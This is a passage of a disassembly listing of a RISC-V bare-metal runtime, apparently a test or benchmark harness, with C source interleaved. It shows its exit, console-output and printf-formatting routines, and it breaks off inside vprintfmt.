    80001610:	02113423          	sd	ra,40(sp)
    80001614:	02813023          	sd	s0,32(sp)
    80001618:	03010413          	add	s0,sp,48
    8000161c:	fea43423          	sd	a0,-24(s0)
    80001620:	feb43023          	sd	a1,-32(s0)
    80001624:	fcc43c23          	sd	a2,-40(s0)
  tohost_exit(1337);
    80001628:	53900513          	li	a0,1337
    8000162c:	fb1ff0ef          	jal	800015dc <tohost_exit>

0000000080001630 <exit>:
{
    80001630:	fe010113          	add	sp,sp,-32
    80001634:	00113c23          	sd	ra,24(sp)
    80001638:	00813823          	sd	s0,16(sp)
    8000163c:	02010413          	add	s0,sp,32
    80001640:	00050793          	mv	a5,a0
    80001644:	fef42623          	sw	a5,-20(s0)
  tohost_exit(code);
    80001648:	fec42783          	lw	a5,-20(s0)
    8000164c:	00078513          	mv	a0,a5
    80001650:	f8dff0ef          	jal	800015dc <tohost_exit>

0000000080001654 <abort>:
{
    80001654:	ff010113          	add	sp,sp,-16
    80001658:	00113423          	sd	ra,8(sp)
    8000165c:	00813023          	sd	s0,0(sp)
    80001660:	01010413          	add	s0,sp,16
  exit(128 + SIGABRT);
    80001664:	08600513          	li	a0,134
    80001668:	fc9ff0ef          	jal	80001630 <exit>

000000008000166c <printstr>:
{
    8000166c:	fd010113          	add	sp,sp,-48
    80001670:	02113423          	sd	ra,40(sp)
    80001674:	02813023          	sd	s0,32(sp)
    80001678:	00913c23          	sd	s1,24(sp)
    8000167c:	03010413          	add	s0,sp,48
    80001680:	fca43c23          	sd	a0,-40(s0)
  syscall(SYS_write, 1, (uintptr_t)s, strlen(s));
    80001684:	fd843483          	ld	s1,-40(s0)
    80001688:	fd843503          	ld	a0,-40(s0)
    8000168c:	3d9000ef          	jal	80002264 <strlen>
    80001690:	00050793          	mv	a5,a0
    80001694:	00078693          	mv	a3,a5
    80001698:	00048613          	mv	a2,s1
    8000169c:	00100593          	li	a1,1
    800016a0:	04000513          	li	a0,64
    800016a4:	e95ff0ef          	jal	80001538 <syscall>
}
    800016a8:	00000013          	nop
    800016ac:	02813083          	ld	ra,40(sp)
    800016b0:	02013403          	ld	s0,32(sp)
    800016b4:	01813483          	ld	s1,24(sp)
    800016b8:	03010113          	add	sp,sp,48
    800016bc:	00008067          	ret

00000000800016c0 <putchar>:
{
    800016c0:	fe010113          	add	sp,sp,-32
    800016c4:	00113c23          	sd	ra,24(sp)
    800016c8:	00813823          	sd	s0,16(sp)
    800016cc:	02010413          	add	s0,sp,32
    800016d0:	00050793          	mv	a5,a0
    800016d4:	fef42623          	sw	a5,-20(s0)
  buf[buflen++] = ch;
    800016d8:	08022783          	lw	a5,128(tp) # 80 <buflen.3>
    800016dc:	0017871b          	addw	a4,a5,1
    800016e0:	0007069b          	sext.w	a3,a4
    800016e4:	08d22023          	sw	a3,128(tp) # 80 <buflen.3>
    800016e8:	fec42703          	lw	a4,-20(s0)
    800016ec:	0ff77713          	zext.b	a4,a4
    800016f0:	04020693          	add	a3,tp,64 # 40 <buf.4>
    800016f4:	00f687b3          	add	a5,a3,a5
    800016f8:	00e78023          	sb	a4,0(a5)
  if (ch == '\n' || buflen == sizeof(buf))
    800016fc:	fec42783          	lw	a5,-20(s0)
    80001700:	0007871b          	sext.w	a4,a5
    80001704:	00a00793          	li	a5,10
    80001708:	00f70a63          	beq	a4,a5,8000171c <putchar+0x5c>
    8000170c:	08022783          	lw	a5,128(tp) # 80 <buflen.3>
    80001710:	00078713          	mv	a4,a5
    80001714:	04000793          	li	a5,64
    80001718:	02f71263          	bne	a4,a5,8000173c <putchar+0x7c>
    syscall(SYS_write, 1, (uintptr_t)buf, buflen);
    8000171c:	04020713          	add	a4,tp,64 # 40 <buf.4>
    80001720:	08022783          	lw	a5,128(tp) # 80 <buflen.3>
    80001724:	00078693          	mv	a3,a5
    80001728:	00070613          	mv	a2,a4
    8000172c:	00100593          	li	a1,1
    80001730:	04000513          	li	a0,64
    80001734:	e05ff0ef          	jal	80001538 <syscall>
    buflen = 0;
    80001738:	08022023          	sw	zero,128(tp) # 80 <buflen.3>
  return 0;
    8000173c:	00000793          	li	a5,0
}
    80001740:	00078513          	mv	a0,a5
    80001744:	01813083          	ld	ra,24(sp)
    80001748:	01013403          	ld	s0,16(sp)
    8000174c:	02010113          	add	sp,sp,32
    80001750:	00008067          	ret

0000000080001754 <printhex>:
{
    80001754:	fc010113          	add	sp,sp,-64
    80001758:	02113c23          	sd	ra,56(sp)
    8000175c:	02813823          	sd	s0,48(sp)
    80001760:	04010413          	add	s0,sp,64
    80001764:	fca43423          	sd	a0,-56(s0)
  for (i = 0; i < 16; i++)
    80001768:	fe042623          	sw	zero,-20(s0)
    8000176c:	06c0006f          	j	800017d8 <printhex+0x84>
    str[15-i] = (x & 0xF) + ((x & 0xF) < 10 ? '0' : 'a'-10);
    80001770:	fc843783          	ld	a5,-56(s0)
    80001774:	0ff7f793          	zext.b	a5,a5
    80001778:	00f7f793          	and	a5,a5,15
    8000177c:	0ff7f713          	zext.b	a4,a5
    80001780:	fc843783          	ld	a5,-56(s0)
    80001784:	00f7f693          	and	a3,a5,15
    80001788:	00900793          	li	a5,9
    8000178c:	00d7e663          	bltu	a5,a3,80001798 <printhex+0x44>
    80001790:	03000793          	li	a5,48
    80001794:	0080006f          	j	8000179c <printhex+0x48>
    80001798:	05700793          	li	a5,87
    8000179c:	00f00693          	li	a3,15
    800017a0:	fec42603          	lw	a2,-20(s0)
    800017a4:	40c686bb          	subw	a3,a3,a2
    800017a8:	0006869b          	sext.w	a3,a3
    800017ac:	00e787bb          	addw	a5,a5,a4
    800017b0:	0ff7f713          	zext.b	a4,a5
    800017b4:	ff068793          	add	a5,a3,-16
    800017b8:	008787b3          	add	a5,a5,s0
    800017bc:	fee78423          	sb	a4,-24(a5)
    x >>= 4;
    800017c0:	fc843783          	ld	a5,-56(s0)
    800017c4:	0047d793          	srl	a5,a5,0x4
    800017c8:	fcf43423          	sd	a5,-56(s0)
  for (i = 0; i < 16; i++)
    800017cc:	fec42783          	lw	a5,-20(s0)
    800017d0:	0017879b          	addw	a5,a5,1
    800017d4:	fef42623          	sw	a5,-20(s0)
    800017d8:	fec42783          	lw	a5,-20(s0)
    800017dc:	0007871b          	sext.w	a4,a5
    800017e0:	00f00793          	li	a5,15
    800017e4:	f8e7d6e3          	bge	a5,a4,80001770 <printhex+0x1c>
  str[16] = 0;
    800017e8:	fe040423          	sb	zero,-24(s0)
  printstr(str);
    800017ec:	fd840793          	add	a5,s0,-40
    800017f0:	00078513          	mv	a0,a5
    800017f4:	e79ff0ef          	jal	8000166c <printstr>
}
    800017f8:	00000013          	nop
    800017fc:	03813083          	ld	ra,56(sp)
    80001800:	03013403          	ld	s0,48(sp)
    80001804:	04010113          	add	sp,sp,64
    80001808:	00008067          	ret

000000008000180c <printnum>:
{
    8000180c:	eb010113          	add	sp,sp,-336
    80001810:	14113423          	sd	ra,328(sp)
    80001814:	14813023          	sd	s0,320(sp)
    80001818:	15010413          	add	s0,sp,336
    8000181c:	eca43c23          	sd	a0,-296(s0)
    80001820:	ecb43823          	sd	a1,-304(s0)
    80001824:	ecc43423          	sd	a2,-312(s0)
    80001828:	00068613          	mv	a2,a3
    8000182c:	00070693          	mv	a3,a4
    80001830:	00078713          	mv	a4,a5
    80001834:	00060793          	mv	a5,a2
    80001838:	ecf42223          	sw	a5,-316(s0)
    8000183c:	00068793          	mv	a5,a3
    80001840:	ecf42023          	sw	a5,-320(s0)
    80001844:	00070793          	mv	a5,a4
    80001848:	eaf42e23          	sw	a5,-324(s0)
  int pos = 0;
    8000184c:	fe042623          	sw	zero,-20(s0)
    digs[pos++] = num % base;
    80001850:	ec446783          	lwu	a5,-316(s0)
    80001854:	ec843703          	ld	a4,-312(s0)
    80001858:	02f776b3          	remu	a3,a4,a5
    8000185c:	fec42783          	lw	a5,-20(s0)
    80001860:	0017871b          	addw	a4,a5,1
    80001864:	fee42623          	sw	a4,-20(s0)
    80001868:	0006871b          	sext.w	a4,a3
    8000186c:	00279793          	sll	a5,a5,0x2
    80001870:	ff078793          	add	a5,a5,-16
    80001874:	008787b3          	add	a5,a5,s0
    80001878:	eee7ac23          	sw	a4,-264(a5)
    if (num < base)
    8000187c:	ec446783          	lwu	a5,-316(s0)
    80001880:	ec843703          	ld	a4,-312(s0)
    80001884:	00f76c63          	bltu	a4,a5,8000189c <printnum+0x90>
    num /= base;
    80001888:	ec446783          	lwu	a5,-316(s0)
    8000188c:	ec843703          	ld	a4,-312(s0)
    80001890:	02f757b3          	divu	a5,a4,a5
    80001894:	ecf43423          	sd	a5,-312(s0)
    digs[pos++] = num % base;
    80001898:	fb9ff06f          	j	80001850 <printnum+0x44>
      break;
    8000189c:	00000013          	nop
  while (width-- > pos)
    800018a0:	0180006f          	j	800018b8 <printnum+0xac>
    putch(padc, putdat);
    800018a4:	ebc42703          	lw	a4,-324(s0)
    800018a8:	ed843783          	ld	a5,-296(s0)
    800018ac:	ed043583          	ld	a1,-304(s0)
    800018b0:	00070513          	mv	a0,a4
    800018b4:	000780e7          	jalr	a5
  while (width-- > pos)
    800018b8:	ec042783          	lw	a5,-320(s0)
    800018bc:	fff7871b          	addw	a4,a5,-1
    800018c0:	ece42023          	sw	a4,-320(s0)
    800018c4:	fec42703          	lw	a4,-20(s0)
    800018c8:	0007071b          	sext.w	a4,a4
    800018cc:	fcf74ce3          	blt	a4,a5,800018a4 <printnum+0x98>
  while (pos-- > 0)
    800018d0:	0600006f          	j	80001930 <printnum+0x124>
    putch(digs[pos] + (digs[pos] >= 10 ? 'a' - 10 : '0'), putdat);
    800018d4:	fec42783          	lw	a5,-20(s0)
    800018d8:	00279793          	sll	a5,a5,0x2
    800018dc:	ff078793          	add	a5,a5,-16
    800018e0:	008787b3          	add	a5,a5,s0
    800018e4:	ef87a703          	lw	a4,-264(a5)
    800018e8:	fec42783          	lw	a5,-20(s0)
    800018ec:	00279793          	sll	a5,a5,0x2
    800018f0:	ff078793          	add	a5,a5,-16
    800018f4:	008787b3          	add	a5,a5,s0
    800018f8:	ef87a783          	lw	a5,-264(a5)
    800018fc:	00078693          	mv	a3,a5
    80001900:	00900793          	li	a5,9
    80001904:	00d7f663          	bgeu	a5,a3,80001910 <printnum+0x104>
    80001908:	05700793          	li	a5,87
    8000190c:	0080006f          	j	80001914 <printnum+0x108>
    80001910:	03000793          	li	a5,48
    80001914:	00e787bb          	addw	a5,a5,a4
    80001918:	0007879b          	sext.w	a5,a5
    8000191c:	0007871b          	sext.w	a4,a5
    80001920:	ed843783          	ld	a5,-296(s0)
    80001924:	ed043583          	ld	a1,-304(s0)
    80001928:	00070513          	mv	a0,a4
    8000192c:	000780e7          	jalr	a5
  while (pos-- > 0)
    80001930:	fec42783          	lw	a5,-20(s0)
    80001934:	fff7871b          	addw	a4,a5,-1
    80001938:	fee42623          	sw	a4,-20(s0)
    8000193c:	f8f04ce3          	bgtz	a5,800018d4 <printnum+0xc8>
}
    80001940:	00000013          	nop
    80001944:	00000013          	nop
    80001948:	14813083          	ld	ra,328(sp)
    8000194c:	14013403          	ld	s0,320(sp)
    80001950:	15010113          	add	sp,sp,336
    80001954:	00008067          	ret

0000000080001958 <getuint>:

static unsigned long long getuint(va_list *ap, int lflag)
{
    80001958:	fe010113          	add	sp,sp,-32
    8000195c:	00813c23          	sd	s0,24(sp)
    80001960:	02010413          	add	s0,sp,32
    80001964:	fea43423          	sd	a0,-24(s0)
    80001968:	00058793          	mv	a5,a1
    8000196c:	fef42223          	sw	a5,-28(s0)
  if (lflag >= 2)
    80001970:	fe442783          	lw	a5,-28(s0)
    80001974:	0007871b          	sext.w	a4,a5
    80001978:	00100793          	li	a5,1
    8000197c:	02e7d063          	bge	a5,a4,8000199c <getuint+0x44>
    return va_arg(*ap, unsigned long long);
    80001980:	fe843783          	ld	a5,-24(s0)
    80001984:	0007b783          	ld	a5,0(a5)
    80001988:	00878693          	add	a3,a5,8
    8000198c:	fe843703          	ld	a4,-24(s0)
    80001990:	00d73023          	sd	a3,0(a4)
    80001994:	0007b783          	ld	a5,0(a5)
    80001998:	04c0006f          	j	800019e4 <getuint+0x8c>
  else if (lflag)
    8000199c:	fe442783          	lw	a5,-28(s0)
    800019a0:	0007879b          	sext.w	a5,a5
    800019a4:	02078063          	beqz	a5,800019c4 <getuint+0x6c>
    return va_arg(*ap, unsigned long);
    800019a8:	fe843783          	ld	a5,-24(s0)
    800019ac:	0007b783          	ld	a5,0(a5)
    800019b0:	00878693          	add	a3,a5,8
    800019b4:	fe843703          	ld	a4,-24(s0)
    800019b8:	00d73023          	sd	a3,0(a4)
    800019bc:	0007b783          	ld	a5,0(a5)
    800019c0:	0240006f          	j	800019e4 <getuint+0x8c>
  else
    return va_arg(*ap, unsigned int);
    800019c4:	fe843783          	ld	a5,-24(s0)
    800019c8:	0007b783          	ld	a5,0(a5)
    800019cc:	00878693          	add	a3,a5,8
    800019d0:	fe843703          	ld	a4,-24(s0)
    800019d4:	00d73023          	sd	a3,0(a4)
    800019d8:	0007a783          	lw	a5,0(a5)
    800019dc:	02079793          	sll	a5,a5,0x20
    800019e0:	0207d793          	srl	a5,a5,0x20
}
    800019e4:	00078513          	mv	a0,a5
    800019e8:	01813403          	ld	s0,24(sp)
    800019ec:	02010113          	add	sp,sp,32
    800019f0:	00008067          	ret

00000000800019f4 <getint>:

static long long getint(va_list *ap, int lflag)
{
    800019f4:	fe010113          	add	sp,sp,-32
    800019f8:	00813c23          	sd	s0,24(sp)
    800019fc:	02010413          	add	s0,sp,32
    80001a00:	fea43423          	sd	a0,-24(s0)
    80001a04:	00058793          	mv	a5,a1
    80001a08:	fef42223          	sw	a5,-28(s0)
  if (lflag >= 2)
    80001a0c:	fe442783          	lw	a5,-28(s0)
    80001a10:	0007871b          	sext.w	a4,a5
    80001a14:	00100793          	li	a5,1
    80001a18:	02e7d063          	bge	a5,a4,80001a38 <getint+0x44>
    return va_arg(*ap, long long);
    80001a1c:	fe843783          	ld	a5,-24(s0)
    80001a20:	0007b783          	ld	a5,0(a5)
    80001a24:	00878693          	add	a3,a5,8
    80001a28:	fe843703          	ld	a4,-24(s0)
    80001a2c:	00d73023          	sd	a3,0(a4)
    80001a30:	0007b783          	ld	a5,0(a5)
    80001a34:	0440006f          	j	80001a78 <getint+0x84>
  else if (lflag)
    80001a38:	fe442783          	lw	a5,-28(s0)
    80001a3c:	0007879b          	sext.w	a5,a5
    80001a40:	02078063          	beqz	a5,80001a60 <getint+0x6c>
    return va_arg(*ap, long);
    80001a44:	fe843783          	ld	a5,-24(s0)
    80001a48:	0007b783          	ld	a5,0(a5)
    80001a4c:	00878693          	add	a3,a5,8
    80001a50:	fe843703          	ld	a4,-24(s0)
    80001a54:	00d73023          	sd	a3,0(a4)
    80001a58:	0007b783          	ld	a5,0(a5)
    80001a5c:	01c0006f          	j	80001a78 <getint+0x84>
  else
    return va_arg(*ap, int);
    80001a60:	fe843783          	ld	a5,-24(s0)
    80001a64:	0007b783          	ld	a5,0(a5)
    80001a68:	00878693          	add	a3,a5,8
    80001a6c:	fe843703          	ld	a4,-24(s0)
    80001a70:	00d73023          	sd	a3,0(a4)
    80001a74:	0007a783          	lw	a5,0(a5)
}
    80001a78:	00078513          	mv	a0,a5
    80001a7c:	01813403          	ld	s0,24(sp)
    80001a80:	02010113          	add	sp,sp,32
    80001a84:	00008067          	ret

0000000080001a88 <vprintfmt>:

static void vprintfmt(void (*putch)(int, void**), void **putdat, const char *fmt, va_list ap)
{
    80001a88:	f9010113          	add	sp,sp,-112
    80001a8c:	06113423          	sd	ra,104(sp)
    80001a90:	06813023          	sd	s0,96(sp)
    80001a94:	04913c23          	sd	s1,88(sp)
    80001a98:	05213823          	sd	s2,80(sp)
    80001a9c:	07010413          	add	s0,sp,112
    80001aa0:	faa43423          	sd	a0,-88(s0)
    80001aa4:	fab43023          	sd	a1,-96(s0)
    80001aa8:	f8c43c23          	sd	a2,-104(s0)
    80001aac:	f8d43823          	sd	a3,-112(s0)
  unsigned long long num;
  int base, lflag, width, precision, altflag;
  char padc;

  while (1) {
    while ((ch = *(unsigned char *) fmt) != '%') {
    80001ab0:	0240006f          	j	80001ad4 <vprintfmt+0x4c>
      if (ch == '\0')
    80001ab4:	3e048c63          	beqz	s1,80001eac <vprintfmt+0x424>
        return;
      fmt++;
    80001ab8:	f9843783          	ld	a5,-104(s0)
    80001abc:	00178793          	add	a5,a5,1
    80001ac0:	f8f43c23          	sd	a5,-104(s0)
      putch(ch, putdat);
    80001ac4:	fa843783          	ld	a5,-88(s0)
    80001ac8:	fa043583          	ld	a1,-96(s0)
    80001acc:	00048513          	mv	a0,s1
    80001ad0:	000780e7          	jalr	a5
    while ((ch = *(unsigned char *) fmt) != '%') {
    80001ad4:	f9843783          	ld	a5,-104(s0)
    80001ad8:	0007c783          	lbu	a5,0(a5)
    80001adc:	0007849b          	sext.w	s1,a5
    80001ae0:	00048713          	mv	a4,s1
    80001ae4:	02500793          	li	a5,37
    80001ae8:	fcf716e3          	bne	a4,a5,80001ab4 <vprintfmt+0x2c>
    }
    fmt++;
    80001aec:	f9843783          	ld	a5,-104(s0)
    80001af0:	00178793          	add	a5,a5,1
    80001af4:	f8f43c23          	sd	a5,-104(s0)

    // Process a %-escape sequence
    last_fmt = fmt;
    80001af8:	f9843783          	ld	a5,-104(s0)
    80001afc:	faf43c23          	sd	a5,-72(s0)
    padc = ' ';
    80001b00:	02000793          	li	a5,32
    80001b04:	fcf403a3          	sb	a5,-57(s0)
    width = -1;
    80001b08:	fff00793          	li	a5,-1
    80001b0c:	fcf42623          	sw	a5,-52(s0)
    precision = -1;
    80001b10:	fff00793          	li	a5,-1
    80001b14:	fcf42423          	sw	a5,-56(s0)
    lflag = 0;
    80001b18:	fc042823          	sw	zero,-48(s0)
    altflag = 0;
    80001b1c:	fa042a23          	sw	zero,-76(s0)
    80001b20:	0100006f          	j	80001b30 <vprintfmt+0xa8>
      goto process_precision;

    case '.':
      if (width < 0)
        width = 0;
      goto reswitch;
    80001b24:	00000013          	nop
    80001b28:	0080006f          	j	80001b30 <vprintfmt+0xa8>
      goto reswitch;

    process_precision:
      if (width < 0)
        width = precision, precision = -1;
      goto reswitch;
    80001b2c:	00000013          	nop
    switch (ch = *(unsigned char *) fmt++) {
    80001b30:	f9843783          	ld	a5,-104(s0)
    80001b34:	00178713          	add	a4,a5,1
    80001b38:	f8e43c23          	sd	a4,-104(s0)
    80001b3c:	0007c783          	lbu	a5,0(a5)
    80001b40:	0007849b          	sext.w	s1,a5
    80001b44:	fdd4869b          	addw	a3,s1,-35
    80001b48:	0006871b          	sext.w	a4,a3
    80001b4c:	05500793          	li	a5,85
    80001b50:	32e7ee63          	bltu	a5,a4,80001e8c <vprintfmt+0x404>
    80001b54:	02069793          	sll	a5,a3,0x20
    80001b58:	0207d793          	srl	a5,a5,0x20
    80001b5c:	00279713          	sll	a4,a5,0x2
    80001b60:	001ff797          	auipc	a5,0x1ff
    80001b64:	8d078793          	add	a5,a5,-1840 # 80200430 <main+0x2c4>
    80001b68:	00f707b3          	add	a5,a4,a5
    80001b6c:	0007a783          	lw	a5,0(a5)
    80001b70:	0007871b          	sext.w	a4,a5
    80001b74:	001ff797          	auipc	a5,0x1ff
    80001b78:	8bc78793          	add	a5,a5,-1860 # 80200430 <main+0x2c4>
    80001b7c:	00f707b3          	add	a5,a4,a5
    80001b80:	00078067          	jr	a5
      padc = '-';
    80001b84:	02d00793          	li	a5,45
    80001b88:	fcf403a3          	sb	a5,-57(s0)
      goto reswitch;
    80001b8c:	fa5ff06f          	j	80001b30 <vprintfmt+0xa8>
      padc = '0';
    80001b90:	03000793          	li	a5,48
    80001b94:	fcf403a3          	sb	a5,-57(s0)
      goto reswitch;
    80001b98:	f99ff06f          	j	80001b30 <vprintfmt+0xa8>
      for (precision = 0; ; ++fmt) {
    80001b9c:	fc042423          	sw	zero,-56(s0)
        precision = precision * 10 + ch - '0';
    80001ba0:	fc842783          	lw	a5,-56(s0)
    80001ba4:	00078713          	mv	a4,a5
    80001ba8:	00070793          	mv	a5,a4
    80001bac:	0027979b          	sllw	a5,a5,0x2
    80001bb0:	00e787bb          	addw	a5,a5,a4
    80001bb4:	0017979b          	sllw	a5,a5,0x1
    80001bb8:	0007879b          	sext.w	a5,a5
    80001bbc:	00f487bb          	addw	a5,s1,a5
    80001bc0:	0007879b          	sext.w	a5,a5
    80001bc4:	fd07879b          	addw	a5,a5,-48
    80001bc8:	fcf42423          	sw	a5,-56(s0)
        ch = *fmt;
    80001bcc:	f9843783          	ld	a5,-104(s0)
    80001bd0:	0007c783          	lbu	a5,0(a5)
    80001bd4:	0007849b          	sext.w	s1,a5
        if (ch < '0' || ch > '9')
    80001bd8:	00048713          	mv	a4,s1
    80001bdc:	02f00793          	li	a5,47
    80001be0:	04e7dc63          	bge	a5,a4,80001c38 <vprintfmt+0x1b0>
    80001be4:	00048713          	mv	a4,s1
    80001be8:	03900793          	li	a5,57
    80001bec:	04e7c663          	blt	a5,a4,80001c38 <vprintfmt+0x1b0>
      for (precision = 0; ; ++fmt) {
    80001bf0:	f9843783          	ld	a5,-104(s0)
    80001bf4:	00178793          	add	a5,a5,1
    80001bf8:	f8f43c23          	sd	a5,-104(s0)
        precision = precision * 10 + ch - '0';
    80001bfc:	fa5ff06f          	j	80001ba0 <vprintfmt+0x118>
      precision = va_arg(ap, int);
    80001c00:	f9043783          	ld	a5,-112(s0)
    80001c04:	00878713          	add	a4,a5,8
    80001c08:	f8e43823          	sd	a4,-112(s0)
    80001c0c:	0007a783          	lw	a5,0(a5)
    80001c10:	fcf42423          	sw	a5,-56(s0)
      goto process_precision;
    80001c14:	0280006f          	j	80001c3c <vprintfmt+0x1b4>
      if (width < 0)
    80001c18:	fcc42783          	lw	a5,-52(s0)
    80001c1c:	0007879b          	sext.w	a5,a5
    80001c20:	f007d2e3          	bgez	a5,80001b24 <vprintfmt+0x9c>
        width = 0;
    80001c24:	fc042623          	sw	zero,-52(s0)
      goto reswitch;
    80001c28:	efdff06f          	j	80001b24 <vprintfmt+0x9c>
      altflag = 1;
    80001c2c:	00100793          	li	a5,1
    80001c30:	faf42a23          	sw	a5,-76(s0)
      goto reswitch;
    80001c34:	efdff06f          	j	80001b30 <vprintfmt+0xa8>
      goto process_precision;
    80001c38:	00000013          	nop
      if (width < 0)
    80001c3c:	fcc42783          	lw	a5,-52(s0)
    80001c40:	0007879b          	sext.w	a5,a5
    80001c44:	ee07d4e3          	bgez	a5,80001b2c <vprintfmt+0xa4>
        width = precision, precision = -1;
    80001c48:	fc842783          	lw	a5,-56(s0)
    80001c4c:	fcf42623          	sw	a5,-52(s0)
    80001c50:	fff00793          	li	a5,-1
    80001c54:	fcf42423          	sw	a5,-56(s0)
      goto reswitch;
    80001c58:	ed5ff06f          	j	80001b2c <vprintfmt+0xa4>

    // long flag (doubled for long long)
    case 'l':
      lflag++;
    80001c5c:	fd042783          	lw	a5,-48(s0)
    80001c60:	0017879b          	addw	a5,a5,1
    80001c64:	fcf42823          	sw	a5,-48(s0)
      goto reswitch;
    80001c68:	ec9ff06f          	j	80001b30 <vprintfmt+0xa8>

    // character
    case 'c':
      putch(va_arg(ap, int), putdat);
    80001c6c:	f9043783          	ld	a5,-112(s0)
    80001c70:	00878713          	add	a4,a5,8
    80001c74:	f8e43823          	sd	a4,-112(s0)
    80001c78:	0007a703          	lw	a4,0(a5)
    80001c7c:	fa843783          	ld	a5,-88(s0)
    80001c80:	fa043583          	ld	a1,-96(s0)
    80001c84:	00070513          	mv	a0,a4
    80001c88:	000780e7          	jalr	a5
      break;
    80001c8c:	21c0006f          	j	80001ea8 <vprintfmt+0x420>

    // string
    case 's':
      if ((p = va_arg(ap, char *)) == NULL)
    80001c90:	f9043783          	ld	a5,-112(s0)
    80001c94:	00878713          	add	a4,a5,8
    80001c98:	f8e43823          	sd	a4,-112(s0)
    80001c9c:	0007b903          	ld	s2,0(a5)
    80001ca0:	00091663          	bnez	s2,80001cac <vprintfmt+0x224>
        p = "(null)";
    80001ca4:	001fe917          	auipc	s2,0x1fe
    80001ca8:	78490913          	add	s2,s2,1924 # 80200428 <main+0x2bc>
      if (width > 0 && padc != '-')
    80001cac:	fcc42783          	lw	a5,-52(s0)
    80001cb0:	0007879b          	sext.w	a5,a5
    80001cb4:	08f05a63          	blez	a5,80001d48 <vprintfmt+0x2c0>
    80001cb8:	fc744783          	lbu	a5,-57(s0)
    80001cbc:	0ff7f713          	zext.b	a4,a5
    80001cc0:	02d00793          	li	a5,45
    80001cc4:	08f70263          	beq	a4,a5,80001d48 <vprintfmt+0x2c0>
        for (width -= strnlen(p, precision); width > 0; width--)
    80001cc8:	fcc42483          	lw	s1,-52(s0)
    80001ccc:	fc842783          	lw	a5,-56(s0)
    80001cd0:	00078593          	mv	a1,a5
    80001cd4:	00090513          	mv	a0,s2
    80001cd8:	5dc000ef          	jal	800022b4 <strnlen>
    80001cdc:	00050793          	mv	a5,a0
    80001ce0:	0007879b          	sext.w	a5,a5
    80001ce4:	40f487bb          	subw	a5,s1,a5
    80001ce8:	0007879b          	sext.w	a5,a5
    80001cec:	fcf42623          	sw	a5,-52(s0)
    80001cf0:	0280006f          	j	80001d18 <vprintfmt+0x290>
          putch(padc, putdat);
    80001cf4:	fc744783          	lbu	a5,-57(s0)
    80001cf8:	0007871b          	sext.w	a4,a5
    80001cfc:	fa843783          	ld	a5,-88(s0)
    80001d00:	fa043583          	ld	a1,-96(s0)
    80001d04:	00070513          	mv	a0,a4
    80001d08:	000780e7          	jalr	a5
        for (width -= strnlen(p, precision); width > 0; width--)
    80001d0c:	fcc42783          	lw	a5,-52(s0)
    80001d10:	fff7879b          	addw	a5,a5,-1
    80001d14:	fcf42623          	sw	a5,-52(s0)
    80001d18:	fcc42783          	lw	a5,-52(s0)
    80001d1c:	0007879b          	sext.w	a5,a5
    80001d20:	fcf04ae3          	bgtz	a5,80001cf4 <vprintfmt+0x26c>
      for (; (ch = *p) != '\0' && (precision < 0 || --precision >= 0); width--) {
    80001d24:	0240006f          	j	80001d48 <vprintfmt+0x2c0>
        putch(ch, putdat);
    80001d28:	fa843783          	ld	a5,-88(s0)
    80001d2c:	fa043583          	ld	a1,-96(s0)
    80001d30:	00048513          	mv	a0,s1
    80001d34:	000780e7          	jalr	a5
        p++;
    80001d38:	00190913          	add	s2,s2,1
      for (; (ch = *p) != '\0' && (precision < 0 || --precision >= 0); width--) {
    80001d3c:	fcc42783          	lw	a5,-52(s0)
    80001d40:	fff7879b          	addw	a5,a5,-1
    80001d44:	fcf42623          	sw	a5,-52(s0)
    80001d48:	00094783          	lbu	a5,0(s2)
    80001d4c:	0007849b          	sext.w	s1,a5
    80001d50:	04048463          	beqz	s1,80001d98 <vprintfmt+0x310>
    80001d54:	fc842783          	lw	a5,-56(s0)
    80001d58:	0007879b          	sext.w	a5,a5
    80001d5c:	fc07c6e3          	bltz	a5,80001d28 <vprintfmt+0x2a0>
    80001d60:	fc842783          	lw	a5,-56(s0)
    80001d64:	fff7879b          	addw	a5,a5,-1
    80001d68:	fcf42423          	sw	a5,-56(s0)
    80001d6c:	fc842783          	lw	a5,-56(s0)
    80001d70:	0007879b          	sext.w	a5,a5
    80001d74:	fa07dae3          	bgez	a5,80001d28 <vprintfmt+0x2a0>
      }
      for (; width > 0; width--)
    80001d78:	0200006f          	j	80001d98 <vprintfmt+0x310>
        putch(' ', putdat);
    80001d7c:	fa843783          	ld	a5,-88(s0)
    80001d80:	fa043583          	ld	a1,-96(s0)
    80001d84:	02000513          	li	a0,32
    80001d88:	000780e7          	jalr	a5
      for (; width > 0; width--)
    80001d8c:	fcc42783          	lw	a5,-52(s0)
    80001d90:	fff7879b          	addw	a5,a5,-1
    80001d94:	fcf42623          	sw	a5,-52(s0)
    80001d98:	fcc42783          	lw	a5,-52(s0)
    80001d9c:	0007879b          	sext.w	a5,a5
    80001da0:	fcf04ee3          	bgtz	a5,80001d7c <vprintfmt+0x2f4>
      break;
    80001da4:	1040006f          	j	80001ea8 <vprintfmt+0x420>

    // (signed) decimal
    case 'd':
      num = getint(&ap, lflag);
    80001da8:	fd042703          	lw	a4,-48(s0)
    80001dac:	f9040793          	add	a5,s0,-112
    80001db0:	00070593          	mv	a1,a4
    80001db4:	00078513          	mv	a0,a5
    80001db8:	c3dff0ef          	jal	800019f4 <getint>
    80001dbc:	00050793          	mv	a5,a0
    80001dc0:	fcf43c23          	sd	a5,-40(s0)
      if ((long long) num < 0) {
    80001dc4:	fd843783          	ld	a5,-40(s0)
    80001dc8:	0207d063          	bgez	a5,80001de8 <vprintfmt+0x360>
        putch('-', putdat);
    80001dcc:	fa843783          	ld	a5,-88(s0)
    80001dd0:	fa043583          	ld	a1,-96(s0)
    80001dd4:	02d00513          	li	a0,45
    80001dd8:	000780e7          	jalr	a5
        num = -(long long) num;
    80001ddc:	fd843783          	ld	a5,-40(s0)
    80001de0:	40f007b3          	neg	a5,a5
    80001de4:	fcf43c23          	sd	a5,-40(s0)
      }
      base = 10;
    80001de8:	00a00793          	li	a5,10
    80001dec:	fcf42a23          	sw	a5,-44(s0)
      goto signed_number;
    80001df0:	0640006f          	j	80001e54 <vprintfmt+0x3cc>

    // unsigned decimal
    case 'u':
      base = 10;
    80001df4:	00a00793          	li	a5,10
    80001df8:	fcf42a23          	sw	a5,-44(s0)
      goto unsigned_number;
    80001dfc:	0400006f          	j	80001e3c <vprintfmt+0x3b4>

    // (unsigned) octal
    case 'o':
      // should do something with padding so it's always 3 octits
      base = 8;
    80001e00:	00800793          	li	a5,8
    80001e04:	fcf42a23          	sw	a5,-44(s0)
      goto unsigned_number;
    80001e08:	0340006f          	j	80001e3c <vprintfmt+0x3b4>

    // pointer
